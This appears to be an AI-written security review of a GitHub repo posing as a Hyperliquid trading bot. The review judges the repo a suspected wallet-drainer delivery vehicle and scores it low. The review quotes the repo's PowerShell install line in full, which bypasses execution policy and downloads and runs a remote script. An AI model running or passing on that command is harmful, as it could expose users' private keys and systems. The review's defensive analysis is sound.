# Evaluation: Hyperliquid-Trading-Bot (xlev-v)

**Repo**: https://github.com/xlev-v/Hyperliquid-Trading-Bot
**Evaluator**: Claude (automated static review)
**Date**: 2026-04-22
**Tier**: 3 (Avoid — suspected malware delivery vehicle)

---

## Threat summary (read first)

This repository contains **no source code**. The entire repo is:

- `README.md` (519 lines, SEO-heavy, markets itself as "production-grade TypeScript")
- `requirements.txt` (Python deps — contradicts the TS claim; appears to be boilerplate padding)
- `.env.example`, `.gitignore`, `LICENSE`
- Exactly one commit (`940fe04 Update README.md`, author `habibaashraf8002@gmail.com`, 2026-03-27)

The README's **only installation instruction** is a Windows PowerShell one-liner that downloads and executes a remote script from a GitHub release:

```
powershell -ep bypass -c "iwr https://github.com/xlev-v/Hyperliquid-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

`-ep bypass` + `iwr | iex` + no source code + a repo claiming to be a trading bot that asks for `PRIVATE_KEY` in `.env` = textbook pattern for a crypto-wallet-drainer / info-stealer distributed via a padded GitHub repo that farms stars for plausibility. The 79 stars are consistent with inorganic boosting.

**Do not download, do not execute, do not clone on a Windows host.** The Linux clone captured here is safe because no `.ps1` is fetched on clone, but the release asset should be treated as hostile.

---

## A. Security (weight: 40%)

| # | Criterion | Score (0-5) | Evidence |
|---|-----------|-------------|----------|
| A1 | Key management | 0 | README instructs user to paste `PRIVATE_KEY=0x...` into `.env`; bot has no source to verify what happens to it. Release payload is opaque. |
| A2 | Dependency hygiene | 0 | `requirements.txt` lists Python deps (web3, eth-account, etc.) in a repo that claims to be TypeScript — suggests copy-paste padding. Includes obscure packages (`poly_eip712_structs`, `py-builder-signing-sdk`, `py-builder-relayer-client`) never actually imported anywhere (no source). |
| A3 | Network surface | 0 | **HIGH SEVERITY**: documented install = remote PowerShell `iex` of a release-hosted `.ps1` with `-ep bypass`. Classic drive-by exec pattern. |
| A4 | Code transparency | 0 | Zero source files. Entire "bot" lives in an un-auditable release asset. |
| A5 | Input validation | 0 | N/A — no code to validate anything. |
| | **A average** | **0.0** | |

## B. Functionality (weight: 30%)

| # | Criterion | Score (0-5) | Evidence |
|---|-----------|-------------|----------|
| B1 | Strategy clarity | 1 | Strategies described in prose (delta-neutral, copy trading, funding arb) but not implemented in-repo. Text is plausible-sounding boilerplate, likely LLM-generated. |
| B2 | Backtesting | 0 | None. |
| B3 | Risk management | 0 | Only env-var knobs listed in README; no code. |
| B4 | Configurability | 1 | README lists many env vars. Unverifiable. |
| B5 | Monitoring | 0 | None. |
| | **B average** | **0.4** | |

## C. Engineering Quality (weight: 20%)

| # | Criterion | Score (0-5) | Evidence |
|---|-----------|-------------|----------|
| C1 | Tests | 0 | None. |
| C2 | Error handling | 0 | N/A. |
| C3 | Documentation | 1 | README is long and glossy but describes a product that doesn't exist in the repo. Shields.io badge links to a different repo (`omgmad/hyperliquid-strategy-bot`) — copy-paste tell. |
| C4 | Code quality | 0 | No code. |
| C5 | Maintenance | 0 | Single commit, single author with generic Gmail, created ~4 weeks before evaluation. |
| | **C average** | **0.2** | |

## D. Hyperliquid Integration (weight: 10%)

| # | Criterion | Score (0-5) | Evidence |
|---|-----------|-------------|----------|
| D1 | SDK usage | 0 | No code. `hyperliquid-python-sdk` is not even in `requirements.txt`. |
| D2 | Testnet support | 1 | README says `TESTNET=true`. Unverifiable. |
| D3 | HL features | 1 | README mentions 1h funding cadence correctly — this is the only HL-specific factual signal in the whole repo, and it's extractable from public docs. |
| | **D average** | **0.67** | |

---

## Final Score

```
Final = (0.0 * 0.4) + (0.4 * 0.3) + (0.2 * 0.2) + (0.67 * 0.1)
      = 0.0 + 0.12 + 0.04 + 0.067
      = 0.23
```

## Verdict

- [ ] >= 4.0: Strong candidate for testnet trials
- [ ] 3.0 - 3.9: Worth investigating, needs hardening
- [ ] 2.0 - 2.9: Reference only
- [x] < 2.0: **Avoid — suspected malware**

## Summary

Not a trading bot. A GitHub repo whose sole function is to convince a Windows user to run a remote PowerShell script from a release asset. The 500-line README is SEO/LLM padding; the `requirements.txt` lists Python packages for a codebase that claims to be TypeScript and contains neither. Treat the release `.ps1` as hostile. This is a data point about the HL OSS ecosystem, not a bot evaluation.

## Key Findings

### Strengths
- (none)

### Concerns
- **HIGH**: Documented install step is `iwr ... | iex` with `-ep bypass` — drive-by code execution from a release asset users cannot audit.
- **HIGH**: Repo contains zero implementation. All functionality lives in an opaque release binary requested by the README.
- **HIGH**: README instructs user to paste `PRIVATE_KEY=0x...` into `.env` before running the opaque binary. Standard wallet-drainer setup.
- **MEDIUM**: Tell-tale copy-paste artifacts: shields.io stars badge points to a different repo (`omgmad/hyperliquid-strategy-bot`); Python requirements.txt in a self-described TS project.
- **MEDIUM**: Single commit, single author with generic Gmail, ~4 weeks old, 79 stars — profile consistent with inorganic star-boosting to manufacture legitimacy.

### Recommendations
- Add this repo (and the release URL) to an internal "avoid / suspected malicious" list.
- Consider reporting to GitHub Trust & Safety as a malware-distribution vector.
- When scouting HL bots, treat any repo whose only install path is `iex` / `curl | bash` of a release asset as presumptively hostile until proven otherwise.
- Pattern to flag in future scouting: repo with (a) no source, (b) glossy README promising trading strategies, (c) remote-exec install, (d) asks for `PRIVATE_KEY`.

## Harvest

Nothing technical to harvest. The finding itself — that the HL OSS long-tail includes wallet-drainer repos disguised as trading bots — is the harvest. Worth adding a scouting heuristic: **files-to-README-ratio**. Any repo where `README.md` is >80% of the total line count and there's no source directory deserves immediate skepticism.
